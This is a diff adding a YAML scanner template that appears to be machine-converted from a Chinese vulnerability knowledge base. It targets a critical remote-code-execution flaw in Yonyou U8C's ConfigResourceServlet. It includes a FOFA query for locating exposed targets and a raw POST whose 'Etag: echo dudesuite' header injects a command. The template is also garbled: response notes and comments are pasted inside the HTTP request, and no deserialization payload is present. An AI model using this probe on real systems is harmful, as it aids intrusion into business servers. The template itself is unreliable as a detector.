@@ -1,0 +1,40 @@
+id: poc-rpldh3secssaqzxb
+info:
+  name: 用友U8C ConfigResourceServlet 反序列化漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rpldh3secssaqzxb'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rpldh3secssaqzxb
+    fofa: icon_hash="1085941792"||app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'POST /servlet/~ic/nc.bs.framework.server.ConfigResourceServlet HTTP/1.1
+
+
+    Accept-Encoding: gzip
+
+
+    Etag: echo dudesuite
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    dudesuite
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
